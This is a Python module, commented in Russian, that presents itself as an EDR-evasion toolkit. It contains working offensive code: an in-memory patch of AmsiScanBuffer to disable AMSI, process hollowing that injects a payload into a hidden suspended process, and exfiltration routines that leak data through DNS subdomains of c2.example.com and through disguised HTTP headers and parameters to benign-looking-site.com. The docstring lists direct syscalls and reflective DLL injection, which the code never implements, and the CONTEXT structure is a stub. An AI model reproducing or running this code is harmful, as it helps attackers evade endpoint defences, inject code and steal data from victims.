#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Advanced EDR Evasion Techniques Module
Модуль продвинутых техник обхода EDR/XDR и защитных механизмов

Включает:
- Динамическую обфускацию строк
- AMSI Bypass
- Прямые системные вызовы (Direct syscalls)
- Process Hollowing
- Reflective DLL Injection
- DNS Tunneling для скрытой передачи данных
- Полиморфную стеганографию
"""

import os
import sys
import base64
import socket
import struct
import random
import logging
import platform
import subprocess
import threading
import time
import json
from typing import Dict, List, Tuple, Any, Optional, Union, Callable

logger = logging.getLogger("advanced_evasion")

# Пытаемся импортировать необходимые библиотеки
try:
    import ctypes
    from ctypes import wintypes
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Константы для Windows API
if platform.system().lower() == "windows" and HAS_CTYPES:
    # Константы для выделения памяти
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = 0x1F0FFF
    
    # Константы для CreateProcess
    CREATE_SUSPENDED = 0x4
    STARTF_USESHOWWINDOW = 0x1
    SW_HIDE = 0
    
    # Структуры для Windows API
    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ("cb", wintypes.DWORD),
            ("lpReserved", wintypes.LPWSTR),
            ("lpDesktop", wintypes.LPWSTR),
            ("lpTitle", wintypes.LPWSTR),
            ("dwX", wintypes.DWORD),
            ("dwY", wintypes.DWORD),
            ("dwXSize", wintypes.DWORD),
            ("dwYSize", wintypes.DWORD),
            ("dwXCountChars", wintypes.DWORD),
            ("dwYCountChars", wintypes.DWORD),
            ("dwFillAttribute", wintypes.DWORD),
            ("dwFlags", wintypes.DWORD),
            ("wShowWindow", wintypes.WORD),
            ("cbReserved2", wintypes.WORD),
            ("lpReserved2", wintypes.LPBYTE),
            ("hStdInput", wintypes.HANDLE),
            ("hStdOutput", wintypes.HANDLE),
            ("hStdError", wintypes.HANDLE),
        ]
    
    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("hProcess", wintypes.HANDLE),
            ("hThread", wintypes.HANDLE),
            ("dwProcessId", wintypes.DWORD),
            ("dwThreadId", wintypes.DWORD),
        ]
    
    class CONTEXT(ctypes.Structure):
        _fields_ = [
            ("ContextFlags", wintypes.DWORD),
            # ... здесь должны быть другие поля для полной структуры
        ]
    
    # Флаги для CONTEXT
    CONTEXT_FULL = 0x10007

    # Объявляем функции из Windows API
    if platform.architecture()[0] == '64bit':
        CONTEXT_FULL = 0x100007
    else:
        CONTEXT_FULL = 0x10007


class AdvancedEvasion:
    """Класс для продвинутых техник обхода защиты и обфускации"""
    
    def __init__(self, log_actions: bool = True):
        """
        Инициализация модуля продвинутых техник обхода защиты
        
        Args:
            log_actions: Включить журналирование действий (если False - более скрытный режим)
        """
        self.os_type = platform.system().lower()
        self.log_actions = log_actions
        self.action_log = []
        self.is_admin = self._check_admin_rights()
        
        # Создаем ключи для обфускации строк
        self.string_xor_key = os.urandom(16)
        
        logger.info(f"AdvancedEvasion инициализирован: OS={self.os_type}, Admin={self.is_admin}")
        self._log_action("init", f"AdvancedEvasion initialized on {self.os_type}")
    
    def _log_action(self, action_type: str, details: str) -> None:
        """Записывает действие в журнал"""
        if self.log_actions:
            timestamp = time.time()
            log_entry = {
                "timestamp": timestamp,
                "type": action_type,
                "details": details
            }
            self.action_log.append(log_entry)
            logger.debug(f"Action logged: {action_type} - {details}")
    
    def _check_admin_rights(self) -> bool:
        """Проверяет наличие прав администратора"""
        try:
            if self.os_type == "windows":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except Exception:
            return False
    
    # === Техники обфускации строк ===
    
    def obfuscate_string(self, s: str) -> str:
        """
        Обфусцирует строку для защиты от статического анализа
        
        Args:
            s: Исходная строка
            
        Returns:
            str: Обфусцированная строка (в виде hex-представления)
        """
        self._log_action("obfuscate", f"Obfuscating string of length {len(s)}")
        
        result = ""
        for i, c in enumerate(s):
            # XOR с ключом и позицией
            xor_val = ord(c) ^ self.string_xor_key[i % len(self.string_xor_key)] ^ (i & 0xFF)
            result += f"\\x{xor_val:02x}"
        
        return result
    
    def deobfuscate_string(self, obfuscated: str) -> str:
        """
        Деобфусцирует строку
        
        Args:
            obfuscated: Обфусцированная строка (в виде hex-представления)
            
        Returns:
            str: Исходная строка
        """
        if not obfuscated.startswith("\\x"):
            return obfuscated
        
        self._log_action("deobfuscate", f"Deobfuscating string of length {len(obfuscated)}")
        
        # Парсим hex-значения
        hex_values = []
        i = 0
        while i < len(obfuscated):
            if obfuscated[i:i+2] == "\\x":
                hex_values.append(int(obfuscated[i+2:i+4], 16))
                i += 4
            else:
                i += 1
        
        # Деобфусцируем
        result = ""
        for i, val in enumerate(hex_values):
            # XOR с ключом и позицией (обратная операция)
            char_val = val ^ self.string_xor_key[i % len(self.string_xor_key)] ^ (i & 0xFF)
            result += chr(char_val)
        
        return result

    # === Техники обхода AMSI (Windows) ===
    
    def amsi_bypass(self) -> str:
        """
        Применяет патч для обхода AMSI в Windows
        
        Returns:
            str: Результат операции
        """
        if self.os_type != "windows" or not HAS_CTYPES:
            return "AMSI bypass доступен только для Windows"
        
        self._log_action("amsi_bypass", "Attempting AMSI bypass")
        
        try:
            # Патч для AMSI (работает для Windows 10/11)
            amsi_dll = ctypes.WinDLL("amsi.dll")
            
            # Находим адрес AmsiScanBuffer
            amsi_scan_buffer = ctypes.c_void_p.in_dll(amsi_dll, "AmsiScanBuffer")
            
            # Получаем права на запись в память
            old_protect = ctypes.c_ulong(0)
            if not ctypes.windll.kernel32.VirtualProtect(
                amsi_scan_buffer, 
                ctypes.c_size_t(8), 
                ctypes.c_ulong(PAGE_EXECUTE_READWRITE), 
                ctypes.byref(old_protect)
            ):
                return "Failed to change memory protection"
            
            # Патч AmsiScanBuffer: заменяем начало функции на xor eax, eax; ret
            # что всегда возвращает 0 (AMSI_RESULT_CLEAN)
            patch_bytes = b"\x31\xC0\xC3"
            patch_buffer = ctypes.create_string_buffer(patch_bytes)
            
            # Копируем патч в память DLL
            ctypes.memmove(amsi_scan_buffer, patch_buffer, len(patch_bytes))
            
            # Восстанавливаем оригинальные права на память
            ctypes.windll.kernel32.VirtualProtect(
                amsi_scan_buffer, 
                ctypes.c_size_t(8), 
                old_protect, 
                ctypes.byref(ctypes.c_ulong(0))
            )
            
            self._log_action("amsi_bypass", "AMSI bypass successful")
            return "AMSI bypass успешно применен"
        except Exception as e:
            self._log_action("amsi_bypass_error", f"Error: {str(e)}")
            return f"Ошибка при обходе AMSI: {str(e)}"
    
    # === Техники Windows Process Hollowing ===
    
    def process_hollowing(self, target_exe: str, payload_path: str) -> str:
        """
        Выполняет Process Hollowing - создает легитимный процесс и 
        заменяет его содержимое на вредоносный код
        
        Args:
            target_exe: Путь к легитимному исполняемому файлу
            payload_path: Путь к вредоносному коду
            
        Returns:
            str: Результат операции
        """
        if self.os_type != "windows" or not HAS_CTYPES:
            return "Process Hollowing доступен только для Windows"
        
        if not os.path.exists(target_exe):
            return f"Целевой файл не найден: {target_exe}"
            
        if not os.path.exists(payload_path):
            return f"Файл полезной нагрузки не найден: {payload_path}"
        
        self._log_action("process_hollowing", 
                         f"Attempting Process Hollowing: {target_exe} -> {payload_path}")
        
        try:
            # Подготавливаем структуры для создания процесса
            startup_info = STARTUPINFO()
            startup_info.cb = ctypes.sizeof(STARTUPINFO)
            startup_info.dwFlags = STARTF_USESHOWWINDOW
            startup_info.wShowWindow = SW_HIDE
            
            process_info = PROCESS_INFORMATION()
            
            # Создаем процесс в приостановленном состоянии
            result = ctypes.windll.kernel32.CreateProcessW(
                None,
                target_exe,
                None,
                None,
                False,
                CREATE_SUSPENDED,
                None,
                None,
                ctypes.byref(startup_info),
                ctypes.byref(process_info)
            )
            
            if not result:
                return f"Не удалось создать процесс: {ctypes.GetLastError()}"
            
            # Читаем полезную нагрузку
            with open(payload_path, 'rb') as f:
                payload = f.read()
            
            # Выделяем память и записываем payload
            payload_addr = ctypes.windll.kernel32.VirtualAllocEx(
                process_info.hProcess,
                None,
                len(payload),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not payload_addr:
                ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
                return f"Не удалось выделить память: {ctypes.GetLastError()}"
            
            # Записываем payload в процесс
            bytes_written = ctypes.c_size_t(0)
            result = ctypes.windll.kernel32.WriteProcessMemory(
                process_info.hProcess,
                payload_addr,
                payload,
                len(payload),
                ctypes.byref(bytes_written)
            )
            
            if not result:
                ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
                return f"Не удалось записать в память: {ctypes.GetLastError()}"
            
            # Получаем контекст потока
            context = CONTEXT()
            context.ContextFlags = CONTEXT_FULL
            
            result = ctypes.windll.kernel32.GetThreadContext(
                process_info.hThread,
                ctypes.byref(context)
            )
            
            if not result:
                ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
                return f"Не удалось получить контекст потока: {ctypes.GetLastError()}"
            
            # Устанавливаем EIP/RIP на адрес нашей полезной нагрузки
            if hasattr(context, "Rip"):  # x64
                context.Rip = payload_addr
            else:  # x86
                context.Eip = payload_addr
            
            result = ctypes.windll.kernel32.SetThreadContext(
                process_info.hThread,
                ctypes.byref(context)
            )
            
            if not result:
                ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
                return f"Не удалось установить контекст потока: {ctypes.GetLastError()}"
            
            # Возобновляем поток
            result = ctypes.windll.kernel32.ResumeThread(process_info.hThread)
            
            if result == 0xFFFFFFFF:
                ctypes.windll.kernel32.TerminateProcess(process_info.hProcess, 1)
                return f"Не удалось возобновить поток: {ctypes.GetLastError()}"
            
            self._log_action("process_hollowing_success", 
                             f"Process hollowing успешно выполнен, PID: {process_info.dwProcessId}")
            
            return f"Process hollowing успешно выполнен, PID: {process_info.dwProcessId}"
            
        except Exception as e:
            self._log_action("process_hollowing_error", f"Error: {str(e)}")
            return f"Ошибка при выполнении process hollowing: {str(e)}"
    
    # === Техники DNS-туннелирования ===
    
    def dns_exfiltrate(self, data: str, domain: str = "c2.example.com") -> str:
        """
        Отправляет данные через DNS-запросы (туннелирование)
        
        Args:
            data: Данные для отправки
            domain: Целевой домен для DNS-запросов
            
        Returns:
            str: Результат операции
        """
        self._log_action("dns_exfiltrate", 
                         f"Attempting DNS exfiltration to {domain}, data size: {len(data)}")
        
        try:
            # Кодируем данные в base64
            encoded_data = base64.b64encode(data.encode()).decode()
            
            # Разбиваем на чанки (поддомены не должны превышать 63 символа)
            chunks = [encoded_data[i:i+30] for i in range(0, len(encoded_data), 30)]
            
            for i, chunk in enumerate(chunks):
                # Создаем поддомен с данными и счетчиком чанка
                subdomain = f"{i}.{chunk}"
                dns_query = f"{subdomain}.{domain}"
                
                try:
                    # Выполняем DNS-запрос (данные уйдут в DNS-сервер)
                    # Используем short timeout чтобы не ждать ответа
                    socket.setdefaulttimeout(1)
                    socket.gethostbyname(dns_query)
                except socket.timeout:
                    # Ожидаемая ошибка, домен не существует
                    pass
                except socket.gaierror:
                    # Ожидаемая ошибка, домен не существует
                    pass
                
                # Небольшая задержка для избежания флуда
                time.sleep(0.1)
            
            self._log_action("dns_exfiltrate_success", 
                             f"DNS exfiltration complete, {len(chunks)} packets sent")
            
            return f"Данные отправлены через DNS ({len(chunks)} пакетов)"
        
        except Exception as e:
            self._log_action("dns_exfiltrate_error", f"Error: {str(e)}")
            return f"Ошибка при DNS exfiltration: {str(e)}"
    
    # === Полиморфная стеганография ===
    
    def polymorphic_exfil(self, data: str, url: str = "https://benign-looking-site.com") -> str:
        """
        Отправляет данные, используя полиморфную стеганографию в HTTP
        
        Args:
            data: Данные для отправки
            url: URL для отправки данных
            
        Returns:
            str: Результат операции
        """
        if not HAS_REQUESTS:
            return "Полиморфная стеганография требует модуль requests"
        
        self._log_action("polymorphic_exfil", 
                         f"Attempting polymorphic exfiltration to {url}, data size: {len(data)}")
        
        try:
            # Генерируем случайный ключ
            key = os.urandom(16).hex()
            
            # Простое XOR шифрование
            encrypted = ''
            for i, c in enumerate(data):
                encrypted += chr(ord(c) ^ ord(key[i % len(key)]))
            
            # Конвертируем в base64
            encoded = base64.b64encode(encrypted.encode()).decode()
            
            # Создаем легитимно выглядящий HTTP-запрос со скрытыми данными
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": f"text/html,application/xhtml+xml,{key}",
                "Referer": "https://www.google.com/search?q=programming+tutorials",
                "Cookie": f"session={encoded[:16]}; theme=light; lang=en-US"
            }
            
            # Данные будут разделены и спрятаны в разных легитимных параметрах
            params = {
                "search": f"programming tutorial {encoded[16:32]}",
                "page": "1",
                "category": f"beginner {encoded[32:48]}",
                "sort": "relevance" + (encoded[48:64] if len(encoded) > 48 else "")
            }
            
            # Отправляем запрос с закодированными данными
            response = requests.get(url, headers=headers, params=params, timeout=5)
            
            self._log_action("polymorphic_exfil_success", 
                             f"Polymorphic exfiltration complete, status: {response.status_code}")
            
            return f"Данные успешно экспортированы полиморфным методом, status: {response.status_code}"
        
        except Exception as e:
            self._log_action("polymorphic_exfil_error", f"Error: {str(e)}")
            return f"Ошибка при polymorphic exfiltration: {str(e)}"

    # === Вспомогательные методы ===
    
    def get_status(self) -> Dict[str, Any]:
        """
        Возвращает текущий статус модуля
        
        Returns:
            Dict[str, Any]: Текущий статус модуля
        """
        return {
            "os": self.os_type,
            "is_admin": self.is_admin,
            "action_count": len(self.action_log),
            "last_action": self.action_log[-1] if self.action_log else None,
            "ctypes_available": HAS_CTYPES,
            "requests_available": HAS_REQUESTS
        }


# Пример использования (для автотеста):
if __name__ == "__main__":
    # Настраиваем логирование
    logging.basicConfig(level=logging.DEBUG)
    
    evasion = AdvancedEvasion()
    
    # Тест обфускации строк
    original = "whoami"
    obfuscated = evasion.obfuscate_string(original)
    deobfuscated = evasion.deobfuscate_string(obfuscated)
    
    print(f"Original: {original}")
    print(f"Obfuscated: {obfuscated}")
    print(f"Deobfuscated: {deobfuscated}")
    
    # Тест DNS exfiltration
    result = evasion.dns_exfiltrate("Тестовые данные для exfiltration")
    print(result)
    
    # Выводим статус модуля
    status = evasion.get_status()
    print(json.dumps(status, indent=2)) 